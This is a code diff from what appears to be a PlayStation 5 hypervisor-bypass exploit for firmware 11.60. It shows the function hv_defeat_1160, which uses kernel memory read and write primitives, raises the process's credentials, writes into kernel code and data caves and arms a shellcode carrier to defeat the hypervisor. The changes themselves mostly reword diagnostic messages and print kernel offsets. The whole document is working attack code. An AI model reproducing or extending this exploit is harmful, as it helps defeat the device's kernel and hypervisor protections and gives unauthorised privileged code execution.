@@ -510,12 +510,12 @@ static int arm_startup_carrier(uint64_t resume_cave) {
                                    STACK_TOP_OFF;
     if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want) {
       if (restore_ists(tss_base, saved_ist)) {
-        notify("11.60 IST6 rollback readback failed; cold reboot required\n");
+        notify("%04x IST6 rollback readback failed; cold reboot required\n", fw);
         return -10;
       }
       kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE, 0);
       if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
-        notify("11.60 carrier-state rollback failed; cold reboot required\n");
+        notify("%04x carrier-state rollback failed; cold reboot required\n", fw);
         return -10;
       }
       return -9;
@@ -566,7 +566,14 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   int rc;
 
   if (shellcode_kernel == NULL || !offsets_present()) {
-    notify("11.60 offsets/raw firmware gate failed; refusing to arm\n");
+    notify("%04x offsets/raw firmware gate failed; refusing to arm\n", fw);
+    notify("gate diag: raw=0x%08x handler_pa=0x%llx cave_pa=0x%llx "
+           "code_cave=0x%llx data_cave=0x%llx\n",
+           (unsigned)kernel_get_fw_version(),
+           (unsigned long long)env_offset.HV_HANDLE_VMEXIT_PA,
+           (unsigned long long)env_offset.HV_CODE_CAVE_PA,
+           (unsigned long long)env_offset.KERNEL_CODE_CAVE,
+           (unsigned long long)env_offset.DATA_CAVE);
     return -1;
   }
   if (sceKernelGetMainSocId() == PS5_PRO_SOC_ID) {
@@ -574,24 +581,24 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     return -1;
   }
   if (validate_wake_cave(shellcode_kernel_len)) {
-    notify("11.60 wake blob/cave mapping validation failed\n");
+    notify("%04x wake blob/cave mapping validation failed\n", fw);
     return -1;
   }
 
   facs = kread64(kg(env_offset.ACPIGBL_FACS));
   if ((facs >> 48) != 0xffffULL) {
-    notify("11.60 AcpiGbl_FACS validation failed; refusing to arm\n");
+    notify("%04x AcpiGbl_FACS validation failed; refusing to arm\n", fw);
     return -1;
   }
 
   kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
   if (pin_to_tss0() || sceKernelGetCurrentCpu() != 15) {
-    notify("11.60 could not pin scheduler CPU 15 / TSS slot zero\n");
+    notify("%04x could not pin scheduler CPU 15 / TSS slot zero\n", fw);
     return -1;
   }
 
   if (walk_page(dmap + AP_PAYLOAD_PAGE, 1)) {
-    notify("11.60 startup-AP carrier page is not executable\n");
+    notify("%04x startup-AP carrier page is not executable\n", fw);
     return -1;
   }
 
@@ -604,7 +611,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   resume_cave = kg(env_offset.DATA_CAVE);
   if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
-    notify("11.60 resume carrier has stale state; cold reboot required\n");
+    notify("%04x resume carrier has stale state; cold reboot required\n", fw);
     return -1;
   }
   kwrite(resume_cave + CAVE_ORACLE_OFF, zeroes, sizeof(zeroes));
@@ -612,7 +619,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   rc = arm_startup_carrier(resume_cave);
   if (rc) {
-    notify("11.60 startup-AP carrier refused to arm (%d)\n", rc);
+    notify("%04x startup-AP carrier refused to arm (%d)\n", fw, rc);
     return -1;
   }
 
